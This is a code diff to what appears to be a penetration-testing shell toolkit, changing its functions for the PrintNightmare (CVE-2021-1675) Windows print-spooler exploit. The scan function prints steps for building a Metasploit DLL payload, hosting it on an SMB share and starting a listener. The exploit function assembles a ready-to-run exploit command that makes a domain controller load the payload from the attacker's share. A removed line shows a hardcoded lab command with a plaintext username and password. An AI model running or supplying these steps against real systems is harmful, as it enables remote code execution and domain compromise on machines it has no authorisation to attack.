@@ -57,7 +57,7 @@ nb-ad-cve-printnightmare-scan() {
     __info "If target is vulnerable, you can generate a dll payload:"
     __ok "nb-shell-handlers-msf-payload"
     __info "Then create a share with smbserver.py:"
-    __ok "sudo smbserver.py -smb2support CompData /path/to/backupscript.dll"
+    __ok "sudo smbserver.py -smb2support CompData payload.dll"
     __info "Then configure & start msf multi/handler"
     __ok "nb-shell-handlers-msf-listener"
     __info "Then exploit the target with command:"
@@ -65,7 +65,13 @@ nb-ad-cve-printnightmare-scan() {
 }
 
 nb-ad-cve-printnightmare-exploit() {
-    _
+    __check-project
+    __ask "Enter the IP of domain controller"
     nb-vars-set-rhost
-    print -z "sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'"
+    nb-vars-set-domain
+    nb-vars-set-user
+    nb-vars-set-pass
+    nb-vars-set-lhost
+
+    print -z "sudo python3 CVE-2021-1675.py ${__DOMAIN}/${__USER}:'${_PASS}'@${__RHOST} '\\\\${__LHOST}\\CompData\\payload.dll'"
 }
